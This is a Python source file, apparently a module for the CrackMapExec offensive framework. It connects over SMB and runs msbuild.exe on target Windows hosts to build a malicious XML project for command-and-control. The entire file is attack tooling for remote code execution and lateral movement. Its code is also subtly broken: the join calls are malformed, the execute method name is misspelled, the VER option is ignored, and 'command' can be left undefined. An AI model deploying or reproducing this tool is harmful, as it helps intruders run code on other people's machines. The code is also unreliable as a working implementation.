#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
class CMEModule:
    '''
        Executes msbuild to build a malicious .xml file for C2 purposes.
        Module by @lolcatlolcat

    '''
    name = 'msbuild'
    description = 'Launches msbuild on a malicious .xml file'
    supported_protocols = ['smb']
    opsec_safe= False #Does the module touch disk?
    multiple_hosts = True #Does it make sense to run this module on multiple hosts at a time?

    def options(self, context, module_options):
        '''
            FILENAME Name of the .xml file to build
            ARCH Architecture of target system (x86 or x 64)
            VER .NET Version targeted
        '''
        self.filename = 'cme.xml'
        self.arch = ''
        self.ver = 'v4.0.30319'

        if module_options and 'FILENAME' in module_options:
            self.filename = module_options["FILENAME"]

        if module_options and 'ARCH' in module_options:
            self.arch = module_options["ARCH"]

    def on_login(self, context, connection):
        if self.arch == 'x64':
            winders = os.path.join(os.environ['WINDIR'], "Microsoft.NET", "Framework64", self.ver, "msbuild.exe")
            command = ''.join(winders, self.filename)

        elif self.arch == 'x86':
            winders = os.path.join(os.environ['WINDIR'], "Microsoft.NET", "Framework", self.ver, "msbuild.exe")
            command = ' '.join(winders, self.filename)
        
        else:
            print("You need to supply the 'ARCH' command line argument :)")

        connection.execte(command)
        context.log.success("Executed msbuild on" + self.filename)